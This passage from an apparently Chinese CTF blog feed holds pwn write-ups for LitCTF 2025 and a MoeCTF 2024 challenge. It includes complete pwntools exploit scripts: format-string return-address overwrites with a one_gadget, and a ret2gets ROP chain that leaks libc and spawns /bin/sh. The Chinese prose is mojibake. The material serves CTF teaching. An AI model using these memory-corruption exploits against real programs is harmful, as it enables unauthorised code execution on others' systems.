src="https://s2.loli.net/2025/05/26/MpW9XOhdj8TADcQ.png" alt="image">l</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr(size):</span><br><span class="line">return u64(p.recv(size).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.31.so&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./fmt&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./fmt&#x27;)</span><br><span class="line">rl(b&#x27;0x&#x27;)</span><br><span class="line">stack=int(p.recv(12),16)</span><br><span class="line">li(hex(stack))</span><br><span class="line">rl(b&#x27;0x&#x27;)</span><br><span class="line">libc_base=int(p.recv(12),16)-libc.sym[&#x27;puts&#x27;]</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">ogg=libc_base+0xe3b01</span><br><span class="line">addr=(stack&amp;0xffff)-15</span><br><span class="line">payload  = b&#x27;%p&#x27;*9</span><br><span class="line">payload += b&#x27;%&#x27;+str(addr - 92).encode()+b&#x27;c%hn&#x27;#11</span><br><span class="line">payload += b&#x27;%&#x27;+str(0x10007b-addr).encode()+b&#x27;c%39$hhn&#x27;</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line">add=(stack+17-0x18)&amp;0xffff</span><br><span class="line">li(hex(add))</span><br><span class="line">sleep(0.5)</span><br><span class="line">payload = b&#x27;%&#x27;+str(0x7b).encode()+b&#x27;c%39$hhn&#x27;</span><br><span class="line">payload+= b&#x27;%&#x27;+str(add-0x7b).encode()+b&#x27;c%27$hn&#x27;</span><br><span class="line">payload =payload.ljust(0x100,b&#x27;\x00&#x27;)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.5)</span><br><span class="line">payload = b&#x27;%&#x27;+str(0x7b).encode()+b&#x27;c%39$hhn&#x27;</span><br><span class="line">payload+= b&#x27;%&#x27;+str((ogg&amp;0xffff)-0x7b).encode()+b&#x27;c%41$hn&#x27;</span><br><span class="line">payload =payload.ljust(0x100,b&#x27;\x00&#x27;)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">sleep(0.5)</span><br><span class="line">payload = b&#x27;%&#x27;+str(0x7b).encode()+b&#x27;c%39$hhn&#x27;</span><br><span class="line">payload+= b&#x27;%&#x27;+str(add+2-0x7b).encode()+b&#x27;c%27$hn&#x27;</span><br><span class="line">payload =payload.ljust(0x100,b&#x27;\x00&#x27;)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.5)</span><br><span class="line">payload = b&#x27;%&#x27;+str(0x7b).encode()+b&#x27;c%39$hhn&#x27;</span><br><span class="line">payload+= b&#x27;%&#x27;+str((ogg&gt;&gt;16&amp;0xffff)-0x7b).encode()+b&#x27;c%41$hn&#x27;</span><br><span class="line">payload =payload.ljust(0x100,b&#x27;\x00&#x27;)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.5)</span><br><span class="line">payload = b&#x27;%&#x27;+str(0x7b).encode()+b&#x27;c%39$hhn&#x27;</span><br><span class="line">payload+= b&#x27;%&#x27;+str(add+2+2-0x7b).encode()+b&#x27;c%27$hn&#x27;</span><br><span class="line">payload =payload.ljust(0x100,b&#x27;\x00&#x27;)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.5)</span><br><span class="line">payload = b&#x27;%&#x27;+str(0x7b).encode()+b&#x27;c%39$hhn&#x27;</span><br><span class="line">payload+= b&#x27;%&#x27;+str((ogg&gt;&gt;32)-0x7b).encode()+b&#x27;c%41$hn&#x27;</span><br><span class="line">payload =payload.ljust(0x100,b&#x27;\x00&#x27;)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&#x27;%&#x27;+str(0x069e).encode()+b&#x27;c%39$hn&#x27;</span><br><span class="line">payload =payload.ljust(0x100,b&#x27;\x00&#x27;)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#a=p.recvall()</span><br><span class="line">#print(len(a)-1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="master-of-rop">master_of_rop</h4><p>é¢˜ç›®ï¼š</p><p><img src="https://s2.loli.net/2025/05/26/8W51rtY79eGqELi.png" alt="image"></p><p>åªå­˜åœ¨ä¸€ä¸ªgetsï¼Œæ²¡æœ‰pop_rdiï¼Œå¦‚ä½•å»æ§åˆ¶rdiå‘¢ï¼Œè¿™é‡Œå¼•å…¥ä¸€ç§æ¯”è¾ƒæ–°é¢–çš„æ‰‹æ³•ï¼Œret2getsï¼Œåœ¨ gets è¿”å›åï¼Œrdi é€šå¸¸æŒ‡å‘ _IO_stdfile_0_lockï¼Œè¿™æ˜¯ä¸€ä¸ª libc ä¸­çš„å¯å†™åœ°å€ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œé€šè¿‡ ROP é“¾å†æ¬¡è°ƒç”¨ getsï¼Œå‘ _IO_stdfile_0_lock å†™å…¥ä»»æ„æ•°æ®ï¼Œå…·ä½“åŸç†ä¼šå¦å¤–å†™ä¸€ç¯‡æ–‡ç« åˆ†æäº†ï¼Œè¿™é‡Œç›´æ¥ç”¨äº†</p><p>ç¬¬ä¸€ä¸ªpaylaod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*(0x20)+p64(0)</span><br><span class="line">payload+= p64(elf.plt[&#x27;gets&#x27;])</span><br><span class="line">payload+= p64(elf.plt[&#x27;puts&#x27;])</span><br><span class="line">payload+= p64(0x401100)+p64(0x4011AD)</span><br></pre></td></tr></table></figure><p>æ§åˆ¶è¿”å›åœ°å€ä¸ºgetsï¼Œå¾€_IO_stdfile_0_lockå†™å…¥(b&quot;A&quot; * 4 + b&quot;\x00&quot;*3)ï¼Œç„¶åä¼šæ³„éœ²å‡ºTLSï¼Œç”±æ­¤è®¡ç®—åç§»å³å¯å¾—åˆ°libcåœ°å€ï¼Œé€šçŸ¥æ§åˆ¶è¿”å›åœ°å€ä¸ºmainï¼Œä¸ºäº†ç¬¬äºŒæ¬¡æ‰“ROPé“¾</p><p>è¿™é‡Œå¯ä»¥ç›´æ¥ç”¨libcä¸­çš„pop_rdiï¼Œä¹Ÿå¯ä»¥ç”¨ret2getsçš„paylaodï¼Œè¿™é‡Œä¸èƒ½ç›´æ¥è¾“å…¥/bin/shï¼Œè°ƒè¯•å‘ç°ç¬¬äºŒä¸ª/è¢«è½¬æ¢ä¸º. ï¼Œå¯ä»¥ç›´æ¥ç”¨$0æˆ–è€…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(b&quot;/bin&quot; + p8(u8(b&quot;/&quot;)+1) + b&quot;sh&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr(size):</span><br><span class="line">return u64(p.recv(size).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">rl(&quot;Welcome to LitCTF2025!&quot;)</span><br><span class="line">payload = b&#x27;a&#x27;*(0x20)+p64(0)</span><br><span class="line">payload+= p64(elf.plt[&#x27;gets&#x27;])</span><br><span class="line">payload+= p64(elf.plt[&#x27;puts&#x27;])</span><br><span class="line">payload+= p64(0x401100)+p64(0x4011AD)</span><br><span class="line">#bug()</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">#pause()</span><br><span class="line">sleep(0.2)</span><br><span class="line">p.sendline(b&quot;A&quot; * 4 + b&quot;\x00&quot;*3)</span><br><span class="line"></span><br><span class="line">p.recv(8)</span><br><span class="line">p.recv(8)</span><br><span class="line">tls = u64(p.recv(6) + b&quot;\x00\x00&quot;)</span><br><span class="line">li(hex(tls))</span><br><span class="line">libc_base = tls -0x3a5740</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line"></span><br><span class="line">rl(&quot;Welcome to LitCTF2025!&quot;)</span><br><span class="line">payload = b&#x27;a&#x27;*(0x20)+p64(0)</span><br><span class="line">payload+= p64(elf.plt[&#x27;gets&#x27;])</span><br><span class="line">payload+= p64(system)</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sleep(0.2)</span><br><span class="line">#sl(b&#x27;$0\x00&#x27;)</span><br><span class="line">p.sendline(b&quot;/bin&quot; + p8(u8(b&quot;/&quot;)+1) + b&quot;sh&quot;)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">LitCTF-pwn</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>æé™fmtåˆ©ç”¨ğŸ§</title>
    <link href="https://www.thir0th.xyz/posts/98523a9a.html"/>
    <id>https://www.thir0th.xyz/posts/98523a9a.html</id>
    <published>2025-05-07T08:10:35.000Z</published>
    <updated>2025-05-07T08:23:09.124Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>æé™fmtåˆ©ç”¨ğŸ§</h1><p>2024Moectfçš„ä¸€é“é¢˜ç›®ï¼Œååˆ†æœ‰è¶£çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨ğŸ˜Šï¼Œæœ€ç»ˆæ•ˆæœæ˜¯å®Œæˆäº†ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¿®æ”¹ä¸¤ä¸ªåœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯æ‰“ä¸€æ¬¡éæ ˆä¸Šfmtçš„æŒ‡é’ˆè·³æ¿ã€‚è¿™æ³¢å±å®æœ‰ç‚¹æé™</p><h3 id="é¢˜ç›®é™„ä»¶">é¢˜ç›®é™„ä»¶</h3><p>å¤¸å…‹é“¾æ¥ï¼š<a href="https://pan.quark.cn/s/3ad0ae74c376">https://pan.quark.cn/s/3ad0ae74c376</a></p><h3 id="é¢˜ç›®åˆ†æ">é¢˜ç›®åˆ†æ</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746521949448-cac6c469-179e-43d8-b8ee-6bd77bce5502.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746521771048-cb5d8c4e-922a-4bb8-ad45-8ecdb6b9f059.png" alt=""></p><p>å¼€å±€ç»™äº†ä¸€ä¸ªæ ˆåœ°å€ï¼Œåè¾¹ç»™äº†ä¸€æ¬¡éæ ˆä¸Šfmtçš„æœºä¼šï¼ŒåŒæ—¶é¢˜ç›®ç»™å‡ºåé—¨ï¼Œä¿æŠ¤æ˜¯å…¨å¼€çš„</p><p>è¿”å›åœ°å€å’Œåé—¨ä¹‹é—´åªå·®ä¸€ä¸ªå­—èŠ‚</p><p>ret:</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746522005933-8af532fe-31f7-4c17-8764-3a63ffc3bfe2.png" alt=""></p><p>backdoor:</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746522046777-6274d413-a195-435b-9177-6e2ea2d0db1f.png" alt=""></p><p>æŒ‰ç…§æ­£å¸¸çš„æ€è·¯ï¼Œéœ€è¦æ„é€ ä¸€æ¬¡æŒ‡é’ˆè·³æ¿ï¼Œé€ æˆa-&gt;b-&gt;ret-&gt;main,å†å»ä¿®æ”¹båœ°å€åç§»mainçš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯%næ˜¯å°†å‰è¾¹çš„å­—èŠ‚æ•°å†™å…¥å¯¹åº”åç§»çš„ä½ç½®ï¼Œè¿™é‡Œå°±æœ‰ä¸€ä¸ªå°tips</p><p><font style="color:#DF2A3F;">ä¸ç®¡ä½ è¾“å…¥çš„å­—èŠ‚æ•°æ˜¯å¤šå°‘ï¼Œ%hhnåªä¼šå»å°†æ€»å­—èŠ‚æ•°çš„æœ€åä¸€ä¸ªå­—èŠ‚å†™å…¥å¯¹åº”åç§»å¤„</font></p><p>ä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x10000000c</span></span><br><span class="line"><span class="number">0x1000000c</span></span><br><span class="line"><span class="number">0x100000c</span></span><br><span class="line"><span class="number">0x10000c</span></span><br><span class="line">æœ€åéƒ½æ˜¯å°†<span class="number">0x0c</span>å†™å…¥å¯¹åº”åç§»å¤„</span><br></pre></td></tr></table></figure><p>å‰ææ˜¯æ¯”å‰è¾¹å…¨éƒ¨è¾“å…¥çš„æ€»å­—èŠ‚æ•°è¦å¤š</p><h4 id="é”™è¯¯æ€è·¯">é”™è¯¯æ€è·¯</h4><p>æŒ‰ç…§æˆ‘ä»¬ä¹‹å‰æŒ‡é’ˆè·³æ¿çš„æ€è·¯ï¼Œåº”è¯¥æ˜¯è¿™æ ·æ„é€ payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%15$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x10008</span>-(stack&amp;<span class="number">0xffff</span>)).encode()+<span class="string">b&#x27;c%45$hhn&#x27;</span></span><br></pre></td></tr></table></figure><p>å®é™…åªä¿®æ”¹äº†ç¬¬ä¸€ä¸ªåœ°å€ï¼Œç¬¬äºŒä¸ªæ²¡æœ‰ä¿®æ”¹</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746523548182-e25f8045-7f7f-4a24-912c-fca8b5637102.png" alt=""></p><p>å¼•ç”¨</p><p><font style="color:rgb(85, 85, 85);">çŒœæµ‹ï¼šä»»æ„åœ°å€å†™ç”¨ </font><code>&lt;font style=&quot;color:rgb(68, 68, 68);&quot;&gt;$&lt;/font&gt;</code><font style="color:rgb(85, 85, 85);"> æŒ‡å®šå†™å…¥å’ŒæŒ‰å‚æ•°é¡ºåºå†™å…¥çš„æ“ä½œæ˜¯å…ˆååˆ†å¼€çš„ï¼Œå…ˆæŒ‰å‚æ•°é¡ºåºå†™å…¥æŒ‡é’ˆåï¼Œå†ç”¨ </font><code>&lt;font style=&quot;color:rgb(68, 68, 68);&quot;&gt;$&lt;/font&gt;</code><font style="color:rgb(85, 85, 85);"> å»åœ¨åˆšåˆšçš„æŒ‡é’ˆåŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹ã€‚</font><strong><font style="color:rgb(85, 85, 85);">æ³¨æ„ï¼šè¿™ä»…ä»…æ˜¯ä¸ªçŒœæµ‹ï¼ŒçœŸç›¸åº”è¯¥å»æºç ä¸­æ‰¾åˆ°ç­”æ¡ˆ</font></strong><font style="color:rgb(85, 85, 85);"> ï¼ˆä»¥åæœ‰æœºä¼šçš„è¯ï¼Œæˆ‘åº”è¯¥ä¼šå»åˆ†æ </font><code>&lt;font style=&quot;color:rgb(68, 68, 68);&quot;&gt;printf&lt;/font&gt;</code><font style="color:rgb(85, 85, 85);"> å‡½æ•°çš„æºç ï¼Œæ¥æ¢ç©¶å‡ºè¿™ä¸ªç­”æ¡ˆï¼Œä½†å¯æƒœä¸æ˜¯ç°åœ¨</font><font style="color:rgb(85, 85, 85);">ğŸ¤”</font><font style="color:rgb(85, 85, 85);">ï¼‰</font></p><h4 id="font-style-color-rgb-85-85-85-æ­£ç¡®æ€è·¯-font"><font style="color:rgb(85, 85, 85);">æ­£ç¡®æ€è·¯</font></h4><p>paylaod</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">13</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack&amp;<span class="number">0xffff</span>)-<span class="number">138</span>).encode()+<span class="string">b&#x27;c%hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x10008</span>-(stack&amp;<span class="number">0xffff</span>)).encode()+<span class="string">b&#x27;c%45$hhn&#x27;</span></span><br></pre></td></tr></table></figure><p><code>printf</code> è§£æå‚æ•°ä¼šæ ¹æ® <code>%</code> è¿›è¡Œåˆ¤æ–­ï¼Œåœ¨ <code>hn</code> å‰é¢ä¸€å…±æœ‰ <code>15</code> ä¸ª <code>%</code> ï¼Œæ‰€ä»¥è¿™ä¸ª <code>%xxxc%hn</code> ä¼šå°† <code>xxx</code> æ•°æ®åŠ ä¸Š <code>%p</code> æ³„éœ²çš„å­—ç¬¦ä¸ªæ•°å†™å…¥ç¬¬åäº”ä¸ªå‚æ•°</p><p>13+1+1=15</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746542481788-65409221-f118-4d3a-8703-172e921beae4.png" alt=""></p><p>stack&amp;0xffff è¿™ä¸ªæ˜¯è¿”å›åœ°å€çš„æœ€åä¸¤ä¸ªå­—èŠ‚</p><p>-138  å‰è¾¹çš„%pæ³„éœ²çš„ä¸œè¥¿ï¼Œéœ€è¦å‡å»è¿™äº›å­—ç¬¦æ•°ï¼Œè¿™é‡Œéœ€è¦æ‰‹åŠ¨è°ƒè¯•è®¡ç®—ï¼Œä¸åŒç‰ˆæœ¬å¯¹åº”ä¹Ÿä¸åŒ</p><p>0x8bæ˜¯139ï¼Œå¤šæ¥å—äº†ä¸€ä¸ª\nï¼Œå¬åˆ«çš„å¸ˆå‚…æ‰å‘ç°è¿™ä¸ªç”¨æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = p.recvall()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a)-<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746533718448-c3fef211-3c49-4dcd-9b7d-72a6839cda3d.png" alt=""></p><p>ä¸€å¼€å§‹æ˜¯ç›´æ¥aiç”Ÿæˆçš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak = b&#x27;0x5555555580400x1000x7ffff7d147e20x1e0x7fffffffbc7c(nil)0x536eddd9e5d93f000x7fffffffdf300x5555555552d90x10x7ffff7c29d90(nil)0x5555555552bd&#x27;</span></span><br><span class="line">leak = <span class="string">b&#x27;0x5555555580400x1000x7ffff7d147e20xb0x7fffffffbc84(nil)0x8b916887b95c3b000x10x7ffff7c29d90(nil)0x5555555551a90x100000000&#x27;</span></span><br><span class="line">decoded = leak.decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å­˜å‚¨è§£æå‡ºçš„åœ°å€</span></span><br><span class="line">results = []</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(decoded):</span><br><span class="line">    <span class="keyword">if</span> decoded.startswith(<span class="string">&#x27;0x&#x27;</span>, i):</span><br><span class="line">        <span class="comment"># æ‰¾ä¸‹ä¸€ä¸ª &#x27;0x&#x27; æˆ– &#x27;(nil)&#x27; çš„ä½ç½®</span></span><br><span 